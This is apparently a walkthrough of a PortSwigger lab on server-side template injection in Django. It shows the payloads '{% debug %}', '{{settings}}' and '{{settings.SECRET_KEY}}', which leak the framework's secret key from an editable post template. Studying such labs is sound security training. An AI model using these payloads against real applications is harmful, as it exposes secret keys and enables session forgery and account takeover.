
# Server-side template injection with information disclosure via user-supplied objects

This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

To solve the lab, steal and submit the framework's secret key.

You can log in to your own account using the following credentials: content-manager:C0nt3ntM4n4g3r

---------------------------------------------

References: 

- https://portswigger.net/web-security/server-side-template-injection/exploiting



![img](images/Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects/1.png)

---------------------------------------------


It is possible to edit the templates of the posts:



![img](images/Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects/2.png)

We find there are values calculated with the format "${product.X}":



![img](images/Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects/3.png)

Trying to add the payload “{{3*3}}” generates the following stack trace:



![img](images/Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects/4.png)

```
Traceback (most recent call last):  File "<string>", line 11, in <module>  File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__    self.nodelist = self.compile_nodelist()  File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist    return parser.parse()  File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse    raise self.error(token, e)django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '*3' from '3*3'
```

Knowing it uses a Django template we can leak debug information with the payload:

```
{% debug %}
```



![img](images/Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects/5.png)

There is an element “settings” in Django of type UserSettingsHolder:

```
{{settings}}
```



![img](images/Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects/6.png)

It contains a SECRET_KEY field:

```
{{settings.SECRET_KEY}}
```



![img](images/Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects/7.png)
